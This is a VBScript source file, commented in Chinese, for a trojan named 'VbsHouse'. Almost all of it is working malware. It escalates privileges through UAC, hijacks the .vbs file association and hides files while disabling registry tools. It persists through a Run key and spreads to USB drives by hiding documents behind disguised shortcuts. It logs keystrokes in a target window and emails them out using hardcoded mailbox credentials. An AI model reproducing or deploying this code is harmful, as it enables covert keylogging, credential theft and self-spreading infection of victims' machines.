Option Explicit
On Error Resume Next

'+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
'+++++++++++++++++++++++++++++++++++++++初始化配置区域++++++++++++++++++++++++++++++++++++++++

'****************************************** 参数设置 *****************************************

Const WINDOW_TITLE			= "无标题 - 记事本"		'要监视的程序的窗口标题文字
Const PROCESS_NAME			= "notepad.exe"			'要监视的程序的进程名称
Const DYN_WRAP_DLL	 		= "dynwrap.dll"			'dynamic wrapper的文件名
Const SENDER_MAIL_ADDRESS	= "2637252534@qq.com"	'用于发送邮件的邮箱地址
Const SENDER_MAIL_PASSWORD 	= "wzc123456"         	'用于发送邮件的邮箱密码
Const SENDEE_MAIL_ADDRESS  	= "610955867@qq.com" 	'用于接收邮件的邮箱地址

'*********************************** 是否是用快捷方式打开 ************************************

Dim g_isRunningWithLnk
g_isRunningWithLnk = False

'Call CheckOpenWithLnk()

Sub CheckOpenWithLnk()
	Dim args
	Set args = WScript.Arguments
	If args.Count = 2 Then 'U盘感染后的快捷方式默认为两个参数 第一个参数为原文件路径 后一个参数为shortcut
		shortcutCheck = args(1)
		If shortcutCheck <> "shortcut" Then Exit Sub
		g_isRunningWithLnk = True
		originFilePath = args(0)
		Call OpenFile(originFilePath)
		Call ReopenVbsHorse()
	End If
End Sub

'************************************* 提升脚本运行权限 **************************************

Dim g_isRunningWithoutUAC '是否提升过权限
g_isRunningWithoutUAC = False

Call DoUACRunScript()

Sub DoUACRunScript()
	If g_isRunningWithLnk Then 
		g_isRunningWithoutUAC = True
		Exit Sub
	End If
	Dim objOS
	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
		If InStr(objOS.Caption, "XP") = 0 Then 
			If WScript.Arguments.Count = 0 Then
				Dim objShell
				Set objShell = CreateObject("Shell.Application")
				objShell.ShellExecute "WScript.exe", Chr(34) &_
				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
				Set objShell = Nothing
				g_isRunningWithoutUAC = True
			End If
		End If
	Next
End Sub

'************************************* 强制程序以32位启动 ************************************

Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
Const CUSTOM_VBS_OPEN_COMMAND_VALUE = """%SystemRoot%\SysWOW64\WScript.exe"" ""%1"" %*"

Dim g_isRunningOnX86
g_isRunningOnX86 = False

Call OpenWithX86()

Sub OpenWithX86() '主函数，强制程序以32位WScript.exe解释执行
	If g_isRunningWithoutUAC = True Then Exit Sub
	If X86orX64() = "X64" Then
		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
			Call SetVbsFileAss()	'改变vbs格式文件关联
			Call ReopenVbsHorse()	'重新启动木马
			Exit Sub
		End If
	End If	
	g_isRunningOnX86 = True
End Sub

Sub ReopenVbsHorse()
	Call OpenFile(WScript.ScriptFullName)
End Sub

Sub SetVbsFileAss() '改变vbs格式文件关联
	Call WriteReg(DEFAULT_VBS_OPEN_COMMAND_KEY, CUSTOM_VBS_OPEN_COMMAND_VALUE, "REG_EXPAND_SZ")
End Sub

Function X86orX64() '判断是X86架构还是X64架构
	Dim objFileSystem, systemRootPath
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	X86orX64 = "X86"
	systemRootPath = objFileSystem.GetSpecialFolder(0) & "\" 
	If objFileSystem.FolderExists(systemRootPath & "SysWow64") Then
		X86orX64 = "X64"
	End if
End Function

'******************************* 注册Dynamic Wrapper DLL ********************************

Call RegisterDynamicWrapperDLL()	'注册Dynamic Wrapper DLL

Sub RegisterDynamicWrapperDLL()		'注册Dynamic Wrapper DLL
	If g_isRunningOnX86 = False Then Exit Sub
	Dim strDllPath
	strDllPath = Replace(WScript.ScriptFullName, WScript.ScriptName, DYN_WRAP_DLL)	'获取DLL文件的绝对路径
	Call RegisterCOM(strDllPath)	'注册DynamicWrapper组件
End Sub

Sub RegisterCOM(strSource)			'注册组件
	Dim objFileSystem, objWshShell, strSystem32Dir
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objWshShell = WScript.CreateObject("WScript.Shell")
	strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\System32\"
	If X86orX64 = "X64" Then
		strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\SysWOW64\"
	End If
	
	If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then Exit Sub
	objFileSystem.CopyFile strSource, strSystem32Dir, False
	WScript.Sleep 1000
	
	Dim blnComplete
	blnComplete = False
	Do
		If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then
			Dim regSvrPath
			regSvrPath = strSystem32Dir & "regsvr32.exe /s "
			objWshShell.Run regSvrPath & strSystem32Dir & DYN_WRAP_DLL
			blnComplete = True
		End If
	Loop Until blnComplete
	WScript.Sleep 2000 '延迟2秒给注册COM预留时间
	Set objFileSystem = Nothing
	Set objWshShell = Nothing	
End Sub

'******************************** 注册要使用的Win32API函数 ********************************

Dim g_objConnectAPI

Call ConfigureWin32API()

Sub ConfigureWin32API
	If g_isRunningOnX86 = False Then Exit Sub
	Set g_objConnectAPI = WScript.CreateObject("DynamicWrapper") '创建全局的DynamicWrapper组件对象实例
	With g_objConnectAPI '以下为声明将要用到的Win32API函数
		.Register "user32.dll", "FindWindow", "i=ss", "f=s", "r=l"
		.Register "user32.dll", "GetForegroundWindow", "f=s", "r=l"
		.Register "user32.dll", "GetAsyncKeyState", "i=l", "f=s", "r=l"
	End With
End Sub

'*************************************** 隐藏所有文件 **************************************

Call HideAllFile()

Sub HideAllFile() '隐藏所有文件，破坏Explorer隐藏选项，隐藏快捷方式小箭头，禁用注册表工具
	Const NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
	Const ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
	Const ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
	Const RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
	Const HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
	Call WriteReg(HideFileRegRootPath & "Hidden", 2, "REG_DWORD") 			'普通文件 			1-显示 2-隐藏
	Call WriteReg(HideFileRegRootPath & "ShowSuperHidden", 0, "REG_DWORD") 	'受系统保护的文件 	1-显示 0-隐藏
	Call WriteReg(HideFileRegRootPath & "HideFileExt", 1, "REG_DWORD") 		'文件扩展名			0-显示 1-隐藏
	Call WriteReg(NoHiddenRegPath, 3, "REG_DWORD") 							'破坏隐藏选项
	Call WriteReg(ShowAllRegPath, 2, "REG_DWORD")							'破坏隐藏选项
	Call WriteReg(RegToolForbidRegPath, 1, "REG_DWORD")						'禁用注册表工具
	Call DeleteReg(ShowShortCurIconRegPath) 								'隐藏快捷方式小箭头
	
	'Call RestartExplorer() '调用次函数可以强制重启Explorer以强制隐藏文件和快键方式小箭头，但是会引起用户的注意，遂取消
End Sub

'************************************* 复制自身到WinDir ************************************

Call Propagate(GetPropagateTragetFolder)

Sub Propagate(targetPath) '复制自身到指定文件夹
	If g_isRunningOnX86 = False Then Exit Sub
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	
	Dim sourcePath, sourceName
	sourcePath = objFileSystem.GetFile(WScript.ScriptFullName)
	sourceName = objFileSystem.GetFile(WScript.ScriptFullName).Name
	If objFileSystem.FileExists(targetPath & sourceName) = False Then
		objFileSystem.CopyFile sourcePath, targetPath, False
		Call HideFile(targetPath & sourceName)
		WScript.Sleep 1000
	End If
	
	Dim dllPath
	dllPath = Replace(sourcePath, sourceName, DYN_WRAP_DLL)
	If objFileSystem.FileExists(targetPath & DYN_WRAP_DLL) = False And objFileSystem.FileExists(dllPath)  Then
		objFileSystem.CopyFile dllPath, targetPath, False
		Call HideFile(targetPath & DYN_WRAP_DLL)
		WScript.Sleep 3000
	End If
	Set objFileSystem = Nothing
End Sub

Function GetPropagateTragetFolder() '返回繁殖的目录
	Dim objWshShell
	Set objWshShell = CreateObject("WScript.Shell")
	getPropagateTragetFolder = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\"
	Set objWshShell = Nothing
End Function

Function GetSelfName()
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	GetSelfName = objFileSystem.GetFile(WScript.ScriptFullName).Name
	Set objFileSystem = Nothing
End Function

'*************************************** 开机自动运行 ***************************************

Call ConfigureAutoRun()

Sub ConfigureAutoRun()
	If g_isRunningOnX86 = False Then Exit Sub
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	Const REG_PATH = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"	'开机启动的注册表地址
	Const KEY_NAME = "VbsHouse"												'需要开机启动的程序的注册表主键
	Dim horsePath
	horsePath = GetPropagateTragetFolder & GetSelfName						'需要开机启动的程序的具体路径
	Call WriteReg(REG_PATH & KEY_NAME, horsePath, "") 						'修改注册表启动项
	Set objFileSystem = Nothing
End Sub

'************************************ 注册其它的全局变量 ************************************

Dim g_theKeyResult '用于保存键盘记录的结果
g_theKeyResult = ""

'**************************************** 执行主循环 ****************************************

Call Main()

Sub Main()
	If g_isRunningOnX86 = False Then Exit Sub
	Dim loopCount
	loopCount = 0
	Do '循环监视指定窗口和U盘
		If IsFoundWindowTitle() And IsTheWindowActive() Then Exit Do '当指定窗口存在且为当前激活窗口跳出循环
		WScript.Sleep 500
		
		loopCount = loopCount - 1
		If(loopCount < 0) Then
			loopCount = 10
			Call SniffUDisk()
		End If
	Loop
	Call RecordKeyBoard()
	'Call(SendEmail SENDER_MAIL_ADDR,SENDER_MAIL_PWD,SENDEE_MAIL_ADDR, "", "按键内容", TheKeyResult, "") '发送按键信息的邮件
	Call Main()
End Sub

'****************************************** 感染U盘 *****************************************

Sub SniffUDisk()
	Dim objFileSystem, SubDrives
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	Set SubDrives = objFileSystem.Drives
	Dim drive
	For Each drive In SubDrives
		Dim drivePath
		drivePath = drive.DriveLetter
		If drive.DriveType = 1 And drive.IsReady Then
			Call InFectDrive(drivePath & ":\")
		End If
	Next
	Set objFileSystem = Nothing
	Set SubDrives = Nothing
End Sub

Sub InFectDrive(drivePath)
	If HasInfected(drivePath) = False Then
		Call Propagate(drivePath)
	End If
	Call LnkInfectDrive(drivePath)
End Sub

Function HasInfected(drivePath) '判断是否已经感染过指定盘符
	Dim objFileSystem
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	Dim horseName, horsePath
	horseName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
	horsePath = drivePath & horseName
	
	HasInfected = False
	If objFileSystem.FileExists(horsePath) Then
		HasInfected = True
	End If
	Set objFileSystem = Nothing
End Function

'************************************** 用快捷方式感染 **************************************

Sub LnkInfectDrive(drivePath) '为磁盘根目录下所有的txt, log, html文件创建指向VbsHorse的快捷方式，并隐藏原文件
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Dim folder, files
	Set folder = objFileSystem.GetFolder(drivePath)
	Set files = folder.Files
	Dim file
	For Each file In files
		Dim fileSuffix
		fileSuffix = GetFileSuffix(file.Name)
		If fileSuffix <> "lnk" And file.Name <> GetSelfName Then '是否不是快捷方式文件，且文件名不是病毒名
			Dim lnkPath
			lnkPath = drivePath & file.Name & ".lnk"
			If objFileSystem.FileExists(lnkPath) = False Then '如果不存在文件
				Dim targetPath, args
				targetPath = drivePath & GetSelfName
				args = Chr(34) & file.Name & Chr(34) & " shortcut"
				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '创建对应的快捷方式并隐藏原文件
			End If
		End If
	Next
	Set objFileSystem = Nothing
End Sub

Function GetFileSuffix(fileName)
	Dim splitFileNameArray
	splitFileNameArray = Split(fileName, ".")
	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
	Set splitFileNameArray = Nothing
End Function

Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '创建对应的快捷方式并隐藏原文件
	Dim originFileSuffix, iconPath
	originFileSuffix = GetFileSuffix(originFilePath)
	Select Case originFileSuffix '检查是否是txt, log, html, htm, mht类型的文件
	Case "txt", "log" '文本
		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
	Case "html", "htm", "mht" '网页
		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
	Case Else
		Exit Sub
	End Select
	
	Call HideFile(originFilePath) '隐藏原文件
	
	Dim objShell, shortcut
	Set objShell = CreateObject("WScript.Shell")
	Set shortcut = objShell.CreateShortcut(lnkPath)
	With Shortcut
		.TargetPath = targetPath
		.Arguments = args
		.WindowStyle = 4
		.IconLocation = iconPath
		.Save
	End With
	Set objShell = Nothing
	Set shortcut = Nothing
End Sub

'*************************************** 记录键盘操作 ***************************************

Sub RecordKeyboard()
	Do '开始循环记录按键，当窗口出于非激活状态后或者用户输入回车键后停止记录按键
		If Not IsTheWindowActive() Then Exit Sub
		Dim TheKey
		theKey = ""
		theKey = GetThePressKey()
		g_theKeyResult = g_theKeyResult & theKey
		WScript.Sleep 5
	Loop Until theKey = "[ENTER]"
	If SendEmail(SENDER_MAIL_ADDRESS, SENDER_MAIL_PASSWORD, SENDEE_MAIL_ADDRESS, "", "来自VbsHouse的邮件", "感谢您测试VbsHouse。您收到的键盘记录信息为:" & g_theKeyResult, "") Then
		WScript.Echo "发送邮件成功。内容:" & g_theKeyResult
	Else
		WScript.Echo "发送邮件失败。内容:" & g_theKeyResult
End If
	g_theKeyResult = ""  '清空键盘记录
End Sub

Function IsFoundWindowTitle() '检测WINDOW_TITLE所指定标题文字的窗口是否存在
	Dim hWnd
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	IsFoundWindowTitle = CBool(hWnd)
End Function

Function IsTheWindowActive() '检测WINDOW_TITLE所指定标题文字的窗口是否为当前激活的窗口

	Dim hWnd,hAct
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	hAct = g_objConnectAPI.GetForegroundWindow()
	IsTheWindowActive = CBool(hWnd=hAct)
	
End Function

Function GetThePressKey() '获取键盘上被按下的键
	With g_objConnectAPI
	    If .GetAsyncKeyState(13) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(17) = -32767 Then
		    GetThePressKey = "[CTRL]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(8) = -32767 Then
		    GetThePressKey = "[BACKSPACE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(9) = -32767 Then
		    GetThePressKey = "[TAB]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(18) = -32767 Then
		    GetThePressKey = "[ALT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(19) = -32767 Then
		    GetThePressKey = "[PAUSE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(20) = -32767 Then
		    GetThePressKey = "[CAPS LOCK]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(27) = -32767 Then
		    GetThePressKey = "[ESC]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(33) = -32767 Then
		    GetThePressKey = "[PAGE UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(34) = -32767 Then
		    GetThePressKey = "[PAGE DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(35) = -32767 Then
		    GetThePressKey = "[END]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(36) = -32767 Then
		    GetThePressKey = "[HOME]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(44) = -32767 Then
		    GetThePressKey = "[SYSRQ]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(45) = -32767 Then
		    GetThePressKey = "[INS]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(46) = -32767 Then
		    GetThePressKey = "[DEL]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(144) = -32767 Then
		    GetThePressKey = "[NUM LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(145) = -32767 Then
		    GetThePressKey = "[SCROLL LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(37) = -32767 Then
		    GetThePressKey = "[LEFT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(38) = -32767 Then
		    GetThePressKey = "[UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(39) = -32767 Then
		    GetThePressKey = "[RIGHT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(40) = -32767 Then
		    GetThePressKey = "[DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(112) = -32767 Then
		    GetThePressKey = "[F1]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(113) = -32767 Then
		    GetThePressKey = "[F2]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(114) = -32767 Then
		    GetThePressKey = "[F3]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(115) = -32767 Then
		    GetThePressKey = "[F4]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(116) = -32767 Then
		    GetThePressKey = "[F5]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(117) = -32767 Then
		    GetThePressKey = "[F6]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(118) = -32767 Then
		    GetThePressKey = "[F7]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(119) = -32767 Then
		    GetThePressKey = "[F8]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(120) = -32767 Then
		    GetThePressKey = "[F9]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(121) = -32767 Then
		    GetThePressKey = "[F10]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(122) = -32767 Then
		    GetThePressKey = "[F11]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(123) = -32767 Then
		    GetThePressKey = "[F12]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(124) = -32767 Then
		    GetThePressKey = "[F13]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(125) = -32767 Then
		    GetThePressKey = "[F14]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(126) = -32767 Then
		    GetThePressKey = "[F15]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(127) = -32767 Then
		    GetThePressKey = "[F16]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(32) = -32767 Then
		    GetThePressKey = "[空格]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(186) = -32767 Then
		    GetThePressKey = ";"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(187) = -32767 Then
		    GetThePressKey = "="
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(188) = -32767 Then
		    GetThePressKey = ","
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(189) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(190) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(191) = -32767 Then
		    GetThePressKey = "/"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(192) = -32767 Then
		    GetThePressKey = "`"
		    Exit Function
	    End If
	  
	    '----------NUM PAD----------
	    If .GetAsyncKeyState(96) = -32767 Then
		    GetThePressKey = "0"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(97) = -32767 Then
		    GetThePressKey = "1"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(98) = -32767 Then
		    GetThePressKey = "2"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(99) = -32767 Then
		    GetThePressKey = "3"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(100) = -32767 Then
		    GetThePressKey = "4"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(101) = -32767 Then
		    GetThePressKey = "5"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(102) = -32767 Then
		    GetThePressKey = "6"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(103) = -32767 Then
		    GetThePressKey = "7"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(104) = -32767 Then
	    	GetThePressKey = "8"
	    	Exit Function
	    End If
	  
	    If .GetAsyncKeyState(105) = -32767 Then
		    GetThePressKey = "9"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(106) = -32767 Then
		    GetThePressKey = "*"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(107) = -32767 Then
		    GetThePressKey = "+"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(108) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(109) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(110) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(&H1) = -32767 Then
		    GetThePressKey = "[鼠标左键]"
		    Exit Function
	    End If
		
	    If .GetAsyncKeyState(&H4) = -32767 Then
		    GetThePressKey = "[鼠标中键]"
		    Exit Function
	    End If		
		
	    If .GetAsyncKeyState(&H2) = -32767 Then
		    GetThePressKey = "[鼠标右键]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(220) = -32767 Then
		    GetThePressKey = "\"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(222) = -32767 Then
		    GetThePressKey = "'"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(221) = -32767 Then
		    GetThePressKey = "[右方括号]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(219) = -32767 Then
		    GetThePressKey = "[左方括号]"
		    Exit Function
	    End If
	  	
	    If .GetAsyncKeyState(16) = -32767 Then
		    GetThePressKey = "[SHIFT]"
		    Exit Function
	    End If
	  		  	
	    If .GetAsyncKeyState(65) = -32767 Then
		    GetThePressKey = "A"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(66) = -32767 Then
		    GetThePressKey = "B"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(67) = -32767 Then
		    GetThePressKey = "C"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(68) = -32767 Then
		    GetThePressKey = "D"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(69) = -32767 Then
		    GetThePressKey = "E"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(70) = -32767 Then
		    GetThePressKey = "F"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(71) = -32767 Then
		    GetThePressKey = "G"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(72) = -32767 Then
		    GetThePressKey = "H"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(73) = -32767 Then
		    GetThePressKey = "I"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(74) = -32767 Then
		    GetThePressKey = "J"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(75) = -32767 Then
		    GetThePressKey = "K"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(76) = -32767 Then
		    GetThePressKey = "L"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(77) = -32767 Then
		    GetThePressKey = "M"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(78) = -32767 Then
		    GetThePressKey = "N"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(79) = -32767 Then
		    GetThePressKey = "O"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(80) = -32767 Then
		    GetThePressKey = "P"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(81) = -32767 Then
		    GetThePressKey = "Q"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(82) = -32767 Then
		    GetThePressKey = "R"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(83) = -32767 Then
		    GetThePressKey = "S"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(84) = -32767 Then
		    GetThePressKey = "T"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(85) = -32767 Then
		    GetThePressKey = "U"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(86) = -32767 Then
		    GetThePressKey = "V"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(87) = -32767 Then
		    GetThePressKey = "W"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(88) = -32767 Then
		    GetThePressKey = "X"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(89) = -32767 Then
		    GetThePressKey = "Y"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(90) = -32767 Then
		    GetThePressKey = "Z"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(48) = -32767 Then
		    GetThePressKey = "[0]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(49) = -32767 Then
		    GetThePressKey = "[1]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(50) = -32767 Then
		    GetThePressKey = "[2]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(51) = -32767 Then
		    GetThePressKey = "[3]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(52) = -32767 Then
		    GetThePressKey = "[4]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(53) = -32767 Then
		    GetThePressKey = "[5]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(54) = -32767 Then
		    GetThePressKey = "[6]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(55) = -32767 Then
		    GetThePressKey = "[7]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(56) = -32767 Then
		    GetThePressKey = "[8]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(57) = -32767 Then
		    GetThePressKey = "[9]"
		    Exit Function
	    End If
	End With
End Function

'**************************************** 发送邮件 ****************************************

Function SendEmail(senderAddress, senderPassword, sendeeAddress, backupAddress, mailTitle, mailContent, mailAttachment)
	On Error Resume Next
	Const MS_Space = "http://schemas.microsoft.com/cdo/configuration/" '配置空间
	
    Dim objEmail
    Set objEmail = CreateObject("CDO.Message")
    Dim strSenderID
    strSenderID = Split(senderAddress, "@", -1, vbTextCompare)
    
    objEmail.From = senderAddress		'寄件人地址
    objEmail.To = sendeeAddress			'收件人地址
    If backupAddress <> "" Then
		objEmail.CC = backupAddress		'备用地址
    End If
    objEmail.Subject = mailTitle   		'邮件主题
    objEmail.TextBody = mailContent 	'邮件内容
    If MailAttachment <> "" Then
		objEmail.AddAttachment mailAttachment	'附件地址
    End If
    
    With objEmail.Configuration.Fields
		.Item(MS_Space & "sendusing") = 2                        	'发信端口
        .Item(MS_Space & "smtpserver") = "smtp." & strSenderID(1)   '发信服务器
        .Item(MS_Space & "smtpserverport") = 25                     'SMTP服务器端口
        .Item(MS_Space & "smtpauthenticate") = 1                    'CDObasec
        .Item(MS_Space & "sendusername") = strSenderID(0)           '寄件人邮箱账户名
        .Item(MS_Space & "sendpassword") = senderPassword           '帐户名密码    
        .Update
    End With
    
	Err.Clear
    objEmail.Send '发送邮件
	
    Set objEmail = Nothing
    SendEmail = True
    
    If Err Then
		'WSCript.Echo Err.Description
        Err.Clear
        SendEmail = False
    End If
End Function

'**************************************** 工具函数 ****************************************

Sub WriteReg(key, value, typeName) '写注册表
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	If typeName = "" Then
		objShell.RegWrite key, value
	Else
		objShell.RegWrite key, value, typeName
	End If
	Set objShell = Nothing
End Sub

Function ReadReg(key) '读取注册表，搜索key，返回所在路径
	On Error Resume Next
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	ReadReg = objShell.RegRead(key)
	Set objShell = Nothing
End Function

Sub DeleteReg(targetPath) '删除注册表
	On Error Resume Next
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.RegDelete targetPath
	Set objShell = Nothing
End Sub

Sub OpenFile(filePath)
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & filePath) '不使用CMD打开，防止产生黑框被用户发觉
	Set objShell = Nothing
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 2 '0-普通 1-只读 2-隐藏 4-系统
	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub